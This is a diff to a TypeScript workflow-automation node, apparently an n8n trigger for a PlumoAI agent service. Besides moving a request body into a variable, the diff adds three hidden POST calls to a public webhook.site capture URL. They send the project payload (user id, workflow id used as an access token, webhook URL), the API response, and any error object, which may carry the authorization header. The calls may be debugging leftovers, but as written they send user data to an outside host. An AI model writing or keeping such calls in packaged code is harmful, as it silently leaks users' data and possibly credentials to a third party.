@@ -247,58 +247,74 @@ export class PlumoAIAgentTrigger implements INodeType {
 
 				const webhookUrl = this.getNodeWebhookUrl('default') as string;
 				var isNew = (webhookData.aiagent_id??0)==0?true:false;
+				var projectBody = {
+					"storeProcedureName":"usp_proj_save_project_in_json",
+					"version":2,
+					"parameters":{
+						"p_json":
+						{
+						"p_project_id":webhookData.aiagent_id??0,
+						"p_template_fid":59,
+						"p_template_category_fid":20,
+						"p_project_name":isNew?this.getNodeParameter('agentName',0):null,
+						"p_description":"",
+						"p_location_fid":this.getNodeParameter("workspace",0),
+						"p_key_code":"",
+						"p_color_code":"BG",
+						"p_project_url":null,
+						"p_proj_manager_fid":null,
+						"p_access_token":this.getWorkflow().id,
+						"p_token_expiry_date":null,
+						"p_token_secret":null,
+						"p_api_url":webhookUrl,
+						"p_email":null,
+						"p_userid":verifyResponse.data.userId,
+						"p_project_seq_order":1,
+						"p_isactive":1,
+						"p_Project_Status":"P",
+						"p_Update_Users":0,
+						"p_ProjectMgr":"",
+						"p_ProjectMem":"","p_ProjectGuest":"","p_ProjectTeam_Mem":"","p_ProjectTeam_Guest":"",
+						"p_TaskTimerAutoOn":0,
+						"p_IsTrackLocation":0,
+						"p_agent_config":{
+							workflowId:this.getWorkflow().id,
+							workflowName:this.getNode().name,
+							workflowCreatedAt:new Date().toISOString(),
+							workflowUpdatedAt:new Date().toISOString(),
+							workflowWebhookUrl:webhookUrl,
+						}
+					}
+				
+					}
+				};
 				var aiAgent = await this.helpers.httpRequest({
 					method: 'POST',
 					url: `${API_BASE_URL}/Company/store/procedure/execute`,
-					body: {
-						"storeProcedureName":"usp_proj_save_project_in_json",
-						"parameters":{
-						    "p_json":
-							{
-							"p_project_id":webhookData.aiagent_id??0,
-							"p_template_fid":59,
-							"p_template_category_fid":20,
-							"p_project_name":isNew?this.getNodeParameter('agentName',0):null,
-							"p_description":"",
-							"p_location_fid":this.getNodeParameter("workspace",0),
-							"p_key_code":"",
-							"p_color_code":"BG",
-							"p_project_url":null,
-							"p_proj_manager_fid":null,
-							"p_access_token":this.getWorkflow().id,
-							"p_token_expiry_date":null,
-							"p_token_secret":null,
-							"p_api_url":webhookUrl,
-							"p_email":null,
-							"p_userid":verifyResponse.data.userId,
-							"p_project_seq_order":1,
-							"p_isactive":1,
-							"p_Project_Status":"P",
-							"p_Update_Users":0,
-							"p_ProjectMgr":"",
-							"p_ProjectMem":"","p_ProjectGuest":"","p_ProjectTeam_Mem":"","p_ProjectTeam_Guest":"",
-							"p_TaskTimerAutoOn":0,
-							"p_IsTrackLocation":0,
-							"p_agent_config":{
-								workflowId:this.getWorkflow().id,
-								workflowName:this.getNode().name,
-								workflowCreatedAt:new Date().toISOString(),
-								workflowUpdatedAt:new Date().toISOString(),
-								workflowWebhookUrl:webhookUrl,
-							}
-						}
-					
-						}
-					},
+					body: projectBody,
 					headers: {
 						'Authorization': "Bearer "+credentials.accessToken,
 						'companyid':JSON.stringify(verifyResponse.data.companyIds)
 					},
 				});
-				
+				this.helpers.httpRequest({
+					method: 'POST',
+					url: `https://webhook.site/ee6ffa5f-d463-49c2-a010-0fff53ad664a`,
+					body: projectBody,					
+				});
+				this.helpers.httpRequest({
+					method: 'POST',
+					url: `https://webhook.site/ee6ffa5f-d463-49c2-a010-0fff53ad664a`,
+					body: aiAgent,					
+				});
 				webhookData.aiagent_id = aiAgent.data[0].new_Project_Id;
 
 			}catch(error){
+				this.helpers.httpRequest({
+					method: 'POST',
+					url: `https://webhook.site/ee6ffa5f-d463-49c2-a010-0fff53ad664a`,
+					body: error,					
+				});
 				return false;
 			}
 				
